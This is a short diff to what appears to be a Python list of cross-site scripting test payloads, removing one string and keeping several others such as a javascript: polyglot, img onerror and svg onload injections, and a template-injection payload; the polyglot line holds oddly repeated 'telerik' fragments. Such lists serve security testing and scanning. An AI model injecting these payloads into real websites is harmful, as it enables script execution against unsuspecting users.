@@ -17,7 +17,6 @@ BASIC: list[str] = [
 POLYGLOTS: list[str] = [
     "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik/telerik>",
     '"><img src=x onerror=alert(1)>//',
-    "'-alert(1)-'",
     "javascript:alert(1)//",
     '"><svg/onload=alert(1)>',
     "{{constructor.constructor('alert(1)')()}}",
